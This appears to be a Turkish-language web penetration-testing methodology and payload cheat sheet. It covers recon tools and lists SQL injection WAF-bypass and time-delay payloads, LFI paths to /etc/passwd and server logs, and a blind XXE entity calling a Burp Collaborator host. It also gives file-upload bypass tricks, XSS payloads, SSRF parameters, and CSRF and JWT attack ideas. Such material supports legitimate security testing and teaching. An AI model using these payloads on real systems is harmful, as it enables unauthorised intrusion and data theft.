

                                                   Recon (Keşif)
Test yapılacak hedef adresin sub domainlerini keşfetmemiz gerekiyor. Bu yüzden saldırı yüzeyini genişleterek daha çok test alanı yaratabiliyoruz.

#####          Kullanılacak osint araçları => Google Dorks,Github, Shodan, Censys, CRT.sh, FindSubdomains vb.

#####                          Subdomain Keşfi Araçları => Subfinder, Amass
           
#####          assetfinder --subs-only <domain>
#####          amass enum  -d target.com --passive | awk '{print $1}' | tee amass.txt
                                        
#####          httpx kullanımı (httprobe aracı tarzı bir keşif aracıdır.) 
http ve https istekleri arasında geçiş yapılabilir. Birden fazla öge http tabanlı taranabilir.

#####          naabu(Port bulma aracı)

                          
                                                 Information Gathering(Bilgi toplama aşaması)
#####          Bilgi sızıntısına karşı arama motorlarını kontrol etmeliyiz.(google dorks,shodan,censys faydalanabiliyoruz.)
#####          Sunucunun parmakizini almak.(çalışan web sunucusunun sürümünü ve türünü belirlemek yardımcı olacaktır.)
#####          Web sunucusu üzerinde yayınlanan aplikasyonları enumerate etme(Kapsam içerisindeki tüm uygulamaları numaralandır.)
#####          Sayfa kaynağının incelenmesi(Kritik bir veri sızıntısı var mı yok mu onun araştırılması ve kodlarda inceleme yapılmalı.)
              -web sayfası yorum satırları ve meta verileri
              -javascript dosyalarına ulaşılmalı ve incelenmeli
              -map dosyaları veya enteresan ayıklama dosyalarının varlığı kontrol edilmeli                                  
#####         Giriş noktalarını yakalama 
              -Uygulamanın ön uç noktalarında request ve response bakılmalı ve enjeksiyon noktaları belirlenmelidir.
####          Entry pointler belirlendikten sonra zafiyetin türü ve niteliği hakkında kesin sonuca ulaşana kadar uygulama üzerinde manipülasyon yapılmalı.
                           
                                                 Uygulama Giriş Noktaları Nerelerdir?                      
Register (Kayıt Ekranları)
Login (Giriş Ekranları)
Yükleme Alanları (File Upload Areas)
Arama kutucukları (Search Box)
Yorum ve Geri Bildirim Sekmeleri (Kısacası input girilen her alan diyebiliriz.)
Contact Us kısmı
Get ve Post Requestleri
Çerezler ve İmport Edilmiş Fonksiyonlar
Url üzerinden kontrol edilebilen parametre kısımları
                                                SQL Injectionları
Enjeksiyon noktasının bulunması
Web sitesi davranışının gözlemlenmesi(Requeste dönen response sonuçları)                                                          
Özel karakterlerin denenmesi
Güvenlik duvarı varsa özel karakterler arasında geçiş yapılması ve bypass edilmesi vb. çeşitli senaryolar
Son olarak Veritabanının dump edilmesi

                                              SQL INJECTION TURLERI
Hata Tabanlı (Payload veya karakter denendiğinde response olarak kodlarda ve sitede hata mesajı görüntülenebiliyorsa vardır diyebiliriz.)
Union tabanlı (Sql sorgu dilince bilindiği üzre union birleştirme görevini yerine getirir 'UNION SELECT * from database_name şeklinde dönen sonuçlarda vardır diyebiliriz.)
Kör Tabanlı (Requeste dönen response içerisinde error veya orderby union tabanlı bir geri dönüş yoksa blind sql injection olabilir)
##### WAF ATLATMASI ÇİN SORGULAR
-Veritabanının kaç sütuna sahip olduğu bulunur:
http://domain.com.br/index.php?id=1' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100-- -
-Bypassing WAF
SQL sorgusundan önce boş bayt kullanma
SQL satır içi yorum sırasını kullanmak
URL Encoding ile bypass
Büyük küçük harf duyarlılığı
SQLMAP sorgu tekniklerini kullanmak
-Sabitleme ve Boşluk Filtresini Atlatma
 -Hata Mesajlarını Bypass etme
http://domain.com/index.php?id=1' order by 1)--
http://domain.com/index.php?id=1' order by 1))--
http://domain.com/index.php?id=1' order by 1;%00
http://domain.com/index.php?id=1' order by 1));%00
http://domain.com/index.php?id=1' order by 1;%60
http://domain.com/index.php?id=1' order by 1%23
http://domain.com/index.php?id=1' order by 1%60
http://domain.com/index.php?id=1' order by 1%90
http://domain.com/index.php?id=1'%23/* order by 1
http://domain.com/index.php?id=1') order by 1
http://domain.com/index.php?id=1' order by 1") ;%00
http://domain.com/index.php?id=1' order by 1#--+
http://domain.com/index.php?id=1' order by 1'))%23               
-Boşluk WAF tabanlı BYPASS
/**/
/**_**/
%23nuLL%0A
%23qa%0A%23%0A
%23foo*%2F*bar%0D%0A
+
-WAF Veritabanından bilgi alınmasını engellerse
Simply replace database() with one of the following payload:
database/*badd*//**/()
database%23%0A(%23%0A)
-Zaman Gecikmelerini Kullan
      Oracle 	      dbms_pipe.receive_message(('a'),10)
      
      Microsoft 	  WAITFOR DELAY '0:0:10'
      
      PostgreSQL 	  SELECT pg_sleep(10)
      
      MySQL 	      SELECT sleep(10)
-Koşullu Gecikmeler İçin
      Oracle 	      SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
      
      Microsoft 	  IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
      
      PostgreSQL 	  SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
      
      MySQL 	      SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')
-Boolean Değerler ile NoSQL Kör enjeksiyonu ile payload enjekte edip varlığını bulma
                                      DIRECTORY TRAVERSAL ATAKLARI(Dizin Geçişi)
-2 Kez Url Encoding Yapmak
-16 bits unicode encoding
-utf-8 unicode encoding
-Bypass "../" replaced by ""
-Bypass "../" with ";" 
-UNC Bypass
-NGINX/ALB Bypass
-ASPNET Cookieless Bypass
                                      FILE INCLUSION(Dosya Ekleme)
-Local File Inclusion
 -Null Byte
 -Double encoding
 -UTF-8 encoding
 -Path and dot truncation
   (FİLTRE ATLATMA İPUÇLARI)
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
-Remote File Inclusion
 -Null byte
 -Double encoding
 -Bypass allow_url_include
-LFI ONEMLI DOSYALARI(
http://example.com/index.php?page=/var/log/apache/access.log
http://example.com/index.php?page=/var/log/apache/error.log
http://example.com/index.php?page=/var/log/apache2/access.log
http://example.com/index.php?page=/var/log/apache2/error.log
http://example.com/index.php?page=/var/log/nginx/access.log
http://example.com/index.php?page=/var/log/nginx/error.log
http://example.com/index.php?page=/var/log/vsftpd.log
http://example.com/index.php?page=/var/log/sshd.log
http://example.com/index.php?page=/var/log/mail
http://example.com/index.php?page=/var/log/httpd/error_log
http://example.com/index.php?page=/usr/local/apache/log/error_log
http://example.com/index.php?page=/usr/local/apache2/log/error_log
                                  XXE INJECTION
-Error Based XXE
  -Error Based - Using Local DTD File
  -Error Based - Using Remote DTD
-Blind XXE(En kolay yolu burp collaborator gibi bir sunucuyu görüntülemeye çalışmaktır)
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;
]>
<r></r>
                                 FILE UPLOAD ATTACKS(UZANTI MANİPÜLASYONU)
-PHP SERVER
  .php
  .php3
  .php4
  .php5
  .php7
  
  # Daha az bilinen uzantılar
  .pht
  .phps
  .phar
  .phpt
  .pgif
  .phtml
  .phtm
  .inc
-ASP SERVER
  .asp
  .aspx
  .config
  .cer and .asa # (IIS <= 7.5)
  shell.aspx;1.jpg # (IIS < 7.0)
  shell.soap
-JSP
  JSP : .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .actions
  Perl: .pl, .pm, .cgi, .lib
  Coldfusion: .cfm, .cfml, .cfc, .dbm
  Node.js: .js, .json, .node
-YÜKLEME PÜF NOKTALARI
  -Çift uzantı kullan : .jpg.php, .png.php5
  -Ters çift uzantı kullan (Yanlış yapılandırılmış bir apache serveri kaynaklı) : .php.jpg
  -Büyük Küçük harf kombinasyonu : .pHp, .pHP5, .PhAr
-NULLBYTE UPLOAD TRICKS
  .php%00.gif
  .php\x00.gif
  .php%00.png
  .php\x00.png
  .php%00.jpg
  .php\x00.jpg
-ÖZEL KARAKTER KULLAN
  -Çoklu noktalama işareti : file.php...... , Windowsta sonunda noktalar olan bir dosya oluşturulduğunda bu noktalar kaldırılacaktır.
  -Boşluk ve yeni satır karakteri
    file.php%20
    file.php%0d%0a.jpg
    file.php%0a
  -Sağı sola kaydırma (RTLO): name.%E2%80%AEphp.jpg will became name.gpj.php.
  -Backslash: file.php/, file.php.\, file.j\sp, file.j/sp
  -Çoklu özel karakter kullanımı: file.jsp/././././.
-MIME TÜRÜNÜ DEĞİŞTİR
  Content-Type : application/x-php or Content-Type : application/octet-stream to Content-Type : image/gif
  Content-Type : image/gif
  Content-Type : image/png
  Content-Type : image/jpeg
  Content-Type wordlist: SecLists/content-type.txt
  Set the Content-Type twice: once for unallowed type and once for allowed.
-MAGIC BYTES
  PNG: \x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
  JPG: \xff\xd8\xff
  GIF: GIF87a OR GIF8;
Filename vulnerabilities
    Time-Based SQLi Payloads: e.g. poc.js'(select*from(select(sleep(20)))a)+'.extension
    LFI/Path Traversal Payloads: e.g. image.png../../../../../../../etc/passwd
    XSS Payloads e.g. '"><img src=x onerror=alert(document.domain)>.extension
    File Traversal e.g. ../../../tmp/lol.png
    Command Injection e.g. ; sleep 10;,
  -CONFIG FILES(KONFİGÜRASYON DOSYALARI)
PHP server'de kod çalıştırma için .htaccess dosyasına göz at.
ASP server'de web.config
uWSGI server'de uwsgi.ini.
    -CVE IMAGEMACIG
    -INSECURE DESERIALIZATION
    -ACCOUNT TAKEOVER(HESAP DEVRALMA)
      IDOR on email change to Account takeover( Hesap devralma olarak e-posta değişikliğinde IDOR)
      Host Header Injection on email change(E-posta değişikliğinde Ana Bilgisayar Başlığı Ekleme)
      Open Redirection to account takeover( Hesabın ele geçirilmesi için Yönlendirmeyi açın)
      HTML Injection to AWS Metadata Leak Leading to AWS takeover( AWS Meta Veri Sızıntısına HTML Ekleme AWS'nin devralınmasına yol açtı)
      Password Reset Poisoning to account takeover( Hesabın ele geçirilmesine neden olan Şifre Sıfırlama Zehirlenmesi)
      Mass Assignment leading to account takeover(Hesabın ele geçirilmesine yol açan Toplu Atama)
      Lack of Server-Side validation in Email during Registration leading to account takeover(Kayıt sırasında E-postada Sunucu Tarafı doğrulamasının olmaması, hesabın ele geçirilmesine neden oluyor)
      Insecure Deeplink allowing account takeover(Hesabın ele geçirilmesine izin veren güvenli olmayan derin bağlantı)
      GraphQL Introspection to account takeover(Hesap devralmaya yönelik GraphQL İç Gözlemi)
      CRLF to XSS leading to account takeover(Hesabın ele geçirilmesine yol açan CRLF'den XSS'ye)
      IDOR on API Parameters(API Parametrelerinde IDOR)
      Account Takeover via CSRF(CSRF Aracılığıyla Hesap Devralma)
    -Kayıt özelliği testi
      Check for duplicate registration/Overwrite existing user(Yinelenen kayıt olup olmadığını kontrol edin/Mevcut kullanıcının üzerine yazın)
      Check for weak password policy(Zayıf şifre politikasını kontrol edin)
      Check for reuse existing usernames( Mevcut kullanıcı adlarının yeniden kullanılıp kullanılmadığını kontrol edin)
      Check for insufficient email verification process(Yetersiz e-posta doğrulama sürecini kontrol edin)
      Weak registration implementation-Allows disposable email addresses(Zayıf kayıt uygulaması-Tek kullanımlık e-posta adreslerine izin verir)
      Weak registration implementation-Over HTTP(Zayıf kayıt uygulaması-HTTP Üzerinden)
                                                -Cross-Site Scripting Testing (XSS TESTİ)
      Theinfosecguy'un QuickXSS aracını kullanarak XSS'yi deneyin
      '"><img src=x onerror=alert(document.domain)>.txt dosyasını kullanarak dosyayı yükleyin
      Komut dosyası etiketleri yasaklanmışsa <h1> ve diğer HTML etiketlerini kullanın
      Çıktı, herhangi bir değişkenin değeri olarak JavaScript'in içine geri yansıtılıyorsa, yalnızca alert(1) kullanın.
      eğer " filtrelendiyse bu veriyi kullanın /><img src=d onerror=confirm(/tushar/);>
      Resim dosyasını kullanarak bir JavaScript yükleyin
      JS veri yükünüzü yürütmenin olağandışı yolu, yöntemi POST'tan GET'e değiştirmektir. Bazen filtreleri atlar
         -Tag Attribute Value
           Giriş geldi -<input type=”text” name=”state” value=”INPUT_FROM_ USER”>
           Eklenecek veri -“ onfocus=”alert(document.cookie)"
           Syntax Encoding payload “%3cscript%3ealert(document.cookie)%3c/script%3e"
         -XSS FİTRELEME ATLATMA
           < and > can be replace with html entities &lt; and &gt;
           You can try an XSS polyglot.Eg:-javascript:/-></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[/[]/+alert(1)//'> 
                                                 -Server-side request forgery (SSRF)
         -En Çok Kullanılan Enjeksiyon Parametreleri:
              "access=", 
              "admin=", 
              "dbg=", 
              "debug=", 
              "edit=", 
              "grant=", 
              "test=", 
              "alter=", 
              "clone=", 
              "create=", 
              "delete=", 
              "disable=", 
              "enable=", 
              "exec=", 
              "execute=", 
              "load=", 
              "make=", 
              "modify=", 
              "rename=", 
              "reset=", 
              "shell=", 
              "toggle=", 
              "adm=", 
              "root=", 
              "cfg=",
              "dest=", 
              "redirect=", 
              "uri=", 
              "path=", 
              "continue=", 
              "url=", 
              "window=", 
              "next=", 
              "data=", 
              "reference=", 
              "site=", 
              "html=", 
              "val=", 
              "validate=", 
              "domain=", 
              "callback=", 
              "return=", 
              "page=", 
              "feed=", 
              "host=", 
              "port=", 
              "to=", 
              "out=",
              "view=", 
              "dir=", 
              "show=", 
              "navigation=", 
              "open=",
              "file=",
              "document=",
              "folder=",
              "pg=",
              "php_path=",
              "style=",
              "doc=",
              "img=",
              "filename="
      -Gizlenmiş Saldırı Yüzeylerini Bulmak
          -GET ile oluşturulmuş URL parametreleri ve Post ile oluşturulan requestlerin burpsuite üzerinden data ve parametreleri ile header başlıkları
          -Referer headeri üzerinden yönlendirme
          -localhost 127.0.0.1 vb. local sunucuları dene.
      -WAF ATLATMA
          -Bypass with [::]
          -Bypass with a domain redirection
          -Bypass using a decimal IP location
          -Bypass using IPv6/IPv4 Address Embedding
          -Bypass using malformed urls
          -Bypass using rare address(short-hand IP addresses by dropping the zeros)
          -Bypass using enclosed alphanumerics
                                                                  -CSRF TESTİ
       -Anti-CSRF Belirtecini kaldır 
       -Anti-CSRf Simgesini değiştir
       -Saldırganın Anti-CSRF ini kullan
       -Anti-Csrf tokeni manipüle et
       -Tahmin edilebilen Anti-CSRF tokenlerini kullan.
       -Anti-CSRF Tokenlerini ele geçir.
                                                                  -JWT TOKEN TESTİ
       -None Algoritması ile yei bir imza oluştur.
       -Gizli keylere kaba kuvvet saldırısı uygula.
       -Asimetrik algoritma'yı simetrik çevirmeye çalış.
       -(CVE-2015-2951) alg=none imza atlama güvenlik açığı
       -(CVE-2016-10555) RS/HS256 genel anahtar uyumsuzluğu güvenlik açığı
       -(CVE-2018-0114) Anahtar ekleme güvenlik açığı
       -(CVE-2019-20933/CVE-2020-28637) Boş parola güvenlik açığı
       -(CVE-2020-28042) Boş imza güvenlik açığı
